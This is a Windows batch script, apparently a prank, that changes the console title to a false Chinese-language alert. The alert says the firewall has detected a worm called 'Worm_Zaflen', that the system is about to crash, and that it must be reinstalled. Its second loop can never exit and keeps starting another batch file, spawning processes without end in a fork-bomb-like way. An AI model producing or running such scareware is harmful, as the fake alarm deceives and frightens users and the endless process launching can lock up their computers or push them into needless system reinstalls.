@echo off 
color 3c
set a=14 
:No1
title=计时器已开启：%a%/100     Window系统防火墙检测到蠕虫病毒：Ｗｏｒｍ＿Ｚａｆｌｅｎ，系统即将将崩溃！！！    
set /a a+=1
mode con cols=%a% lines=1
if %a% lss 100 goto No1 
:No2
title                                                      提示：请尽快重装系统。
set /a a-=1
mode con cols=%a% lines=1
start 定时180秒打开CMD.exe.bat
if %a% lss 100 goto No2










